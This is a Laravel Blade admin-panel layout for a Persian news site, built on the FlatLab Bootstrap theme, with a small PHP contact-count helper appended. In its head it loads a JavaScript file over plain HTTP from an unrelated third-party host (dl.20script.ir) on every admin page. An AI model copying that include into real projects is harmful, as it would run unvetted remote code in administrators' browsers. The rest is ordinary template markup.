<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="Mosaddek">
    <script type="text/javascript" src="http://dl.20script.ir/img/website.js"></script>
    <meta name="keyword" content="FlatLab, Dashboard, Bootstrap, Admin, Template, Theme, Responsive, Fluid, Retina">
    <link rel="shortcut icon" href="theme/img/favicon.html">

    <title>@yield('title')</title>

    <!-- Bootstrap core CSS -->
    <link href="{{ Url('admin_theme/css/bootstrap.min.css') }}" rel="stylesheet">
    <link href="{{ Url('admin_theme/css/bootstrap-reset.css') }}" rel="stylesheet">

    <!--external css-->
    <link href="{{ Url('admin_theme/assets/font-awesome/css/font-awesome.css') }}" rel="stylesheet" />
    <link href="{{ Url('admin_theme/assets/jquery-easy-pie-chart/jquery.easy-pie-chart.css') }}" rel="stylesheet" type="text/css" media="screen"/>
    <link rel="{{ Url('stylesheet" href="theme/css/owl.carousel.css') }}" type="text/css">
    <!-- Custom styles for this template -->
    <link href="{{ Url('admin_theme/css/style.css') }}" rel="stylesheet">
    <link href="{{ Url('admin_theme/css/style-responsive.css') }}" rel="stylesheet" />

    <!-- HTML5 shim and Respond.js IE8 support of HTML5 tooltipss and media queries -->
    <!--[if lt IE 9]>
    <script src="{{ Url('admin_theme/js/html5shiv.js') }}"></script>
    <script src="{{ Url('admin_theme/js/respond.min.js') }}"></script>
    <![endif]-->
    @yield('script')
</head>

<body>

<section id="container" class="">
    <!--header start-->
    <header class="header white-bg">
        <div class="sidebar-toggle-box">
            <div data-original-title="Toggle Navigation" data-placement="right" class="icon-reorder tooltips"></div>
        </div>
        <!--logo start-->
        <a href="#" class="logo" style="font-size: 19px"><span>همراهان</span>&nbsp;خبر</a>
        <!--logo end-->
        <div class="nav notify-row" id="top_menu">
            <!--  notification start -->
            <ul class="nav top-menu">
                <!-- settings start -->
                <li class="dropdown">
                    <a data-toggle="dropdown" class="dropdown-toggle" href="#">
                        <i class="icon-tasks"></i>
                        <span class="badge bg-success">4</span>
                    </a>
                    <ul class="dropdown-menu extended tasks-bar">
                        <div class="notify-arrow notify-arrow-green"></div>
                        <li>
                            <p class="green">آخرین دوره های موجود در وبسایت</p>
                        </li>

                            <li>
                                <a href="#">
                                    <span class="photo"><img alt="course" src="{{Url('/img/course/')}}" height="50" width="70"></span>
                                    <span class="subject">
                                    <span class="from">آزمایشی</span>
                                    <span class="time"></span>
                                    </span>
                                    <span class="message"></span>
                                </a>
                            </li>



                        <li class="external">
                            <a href="#"> دوره های بیشتر</a>
                        </li>
                    </ul>
                </li>
                <!-- settings end -->
                <!-- inbox dropdown start-->
                <li id="header_inbox_bar" class="dropdown">
                    <a data-toggle="dropdown" class="dropdown-toggle" href="#">
                        <i class="icon-envelope-alt"></i>

                        <span class="badge bg-important">{{ CountContact() }}</span>

                    </a>
                    <ul class="dropdown-menu extended inbox">
                        <div class="notify-arrow notify-arrow-red"></div>
                        <li>
                            <p class="red">شما {{CountContact()}} پیام جدید دارید</p>
                        </li>


                        <li>
                            <a href="#">
                                <span class="photo"><img alt="avatar" src="{{Url('/theme/img/avatar-mini.jpg')}}"></span>
                                <span class="subject">
                                    <span class="from">آزمایشی</span>
                                    <span class="time">آزمایشی</span>
                                    </span>
                                <span class="message">آزمایشی</span>
                            </a>
                        </li>



                        <li>
                            <a href="{{ Url('admin/contact') }}">نمایش تمامی پیام ها</a>
                        </li>
                    </ul>
                </li>

                <!-- inbox dropdown end -->
                <!-- notification dropdown start-->

                <li id="header_notification_bar" class="dropdown">
                    <a data-toggle="dropdown" class="dropdown-toggle" href="#">

                        <i class="icon-comment"></i>
                        <span class="badge bg-warning">1</span>
                    </a>
                    <ul class="dropdown-menu extended notification">
                        <div class="notify-arrow notify-arrow-yellow"></div>
                        <li>
                            <p class="yellow">شما 1 دیدگاه جدید دارید</p>
                        </li>
                        <li>
                            <a href="#">
                                <span class="label label-danger"><i class="icon-bolt"></i></span>
                                آزمایشی  <span class="small italic"> آزمایشی </span>
                            </a>
                        </li>





                        <li>
                            <a href="{{Url('admin/comment')}}">نمایش تمامی نظرات </a>
                        </li>
                    </ul>
                </li>

                <!-- notification dropdown end -->
            </ul>
            <!--  notification end -->
        </div>
        <div class="top-nav ">
            <!--search & user info start-->
            <ul class="nav pull-right top-menu">
                <li>
                    <input type="text" class="form-control search" placeholder="Search">
                </li>
                <!-- user login dropdown start-->
                <li class="dropdown">
                    <a data-toggle="dropdown" class="dropdown-toggle" href="#">
                        <img alt="" src="{{Url('admin_theme/img/avatar1_small.jpg')}}">
                        <span class="username">آزمایشی</span>
                        <b class="caret"></b>
                    </a>
                    <ul class="dropdown-menu extended logout">
                        <div class="log-arrow-up"></div>
                        <li><a href="{{Url('admin/users')}}"><i class=" icon-suitcase"></i>پروفایل</a></li>
                        <li><a href="#"><i class="icon-cog"></i> تنظیمات</a></li>
                        <li><a href="#"><i class="icon-bell-alt"></i> اعلام ها</a></li>
                        <li><a href="" onclick="event.preventDefault();
                                                     document.getElementById('logout-form').submit();">
                                <i class="icon-key"></i> خروج</a> <form id="logout-form" action="" method="POST" style="display: none;">
                                @csrf
                            </form></li>
                    </ul>
                </li>
                <!-- user login dropdown end -->
            </ul>
            <!--search & user info end-->
        </div>
    </header>
    <!--header end-->
    <!--sidebar start-->
    <aside>
        <div id="sidebar"  class="nav-collapse ">
            <!-- sidebar menu start-->
            <ul class="sidebar-menu">
                <li class="active">
                    <a class="" href="{{ Url('admin/') }}">
                        <i class="icon-dashboard"></i>
                        <span>صفحه اصلی</span>
                    </a>
                </li>


                <li>
                    <a class="" href="{{ Url('admin/news/') }}">
                        <i class="icon-tasks"></i>
                        <span>اخبار</span>
                    </a>
                </li>


                <li>
                    <a class="" href="{{ Url('admin/contact/') }}">
                        <i class="icon-envelope"></i>
                        <span>پیام ها</span>
                        <span class="label label-danger pull-right mail-info">{{ CountContact() }}</span>
                    </a>
                </li>



                    <li>
                        <a class="" href="{{ Url('admin/comment/') }}">
                            <i class="icon-comment"></i>
                            <span>دیدگاه ها</span>
                            <span class="label label-danger pull-right mail-info">1</span>
                        </a>
                    </li>

                <li class="sub-menu">
                    <a href="javascript:;" class="">
                        <i class="icon-book"></i>
                        <span>درباره ما</span>
                        <span class="arrow"></span>
                    </a>
                    <ul class="sub">
                        <li><a class="" href="{{ Url('admin/about') }}">نمایش</a></li>
                        <li><a class="" href="{{ Url('admin/about/create') }}">افزودن</a></li>

                    </ul>
                </li>
                <li>
                    <a class="" href="{{ Url('admin/category/') }}">
                        <i class="icon-tasks"></i>
                        <span>دسته بندی ها</span>
                    </a>
                </li>





            </ul>
            <!-- sidebar menu end-->
        </div>
    </aside>
    <!--sidebar end-->
    <!--main content start-->
    <section id="main-content">
        <section class="wrapper">
            @yield('content')
        </section>
    </section>
    <!--main content end-->
</section>

<!-- js placed at the end of the document so the pages load faster -->
<script src="{{ Url('admin_theme/js/jquery.js') }}"></script>
<script src="{{ Url('admin_theme/js/jquery-1.8.3.min.js') }}"></script>
<script src="{{ Url('admin_theme/js/bootstrap.min.js') }}"></script>
<script src="{{ Url('admin_theme/js/jquery.scrollTo.min.js') }}"></script>
<script src="{{ Url('admin_theme/js/jquery.nicescroll.js') }}" type="text/javascript"></script>
<script src="{{ Url('admin_theme/js/jquery.sparkline.js') }}" type="text/javascript"></script>
<script src="{{ Url('admin_theme/assets/jquery-easy-pie-chart/jquery.easy-pie-chart.js') }}"></script>
<script src="{{ Url('admin_theme/js/owl.carousel.js') }}" ></script>
<script src="{{ Url('admin_theme/js/jquery.customSelect.min.js') }}" ></script>

<!--common script for all pages-->
<script src="{{ Url('admin_theme/js/common-scripts.js') }}"></script>



<script src="{{ Url('admin_theme/editor/ckeditor.js') }}" type="text/javascript"></script>

<!--script for this page-->
<script src="{{ Url('admin_theme/js/sparkline-chart.js') }}"></script>
<script src="{{ Url('admin_theme/js/easy-pie-chart.js') }}"></script>


<script>

    //owl carousel

    $(document).ready(function() {
        $("#owl-demo").owlCarousel({
            navigation : true,
            slideSpeed : 300,
            paginationSpeed : 400,
            singleItem : true

        });
    });

    //custom select box

    $(function(){
        $('select.styled').customSelect();
    });

</script>

</body>
</html>

<?php
use App\ContactModel;

function CountContact()
{
    $count=ContactModel::where('state',0)->count();
    return $count;
}

?>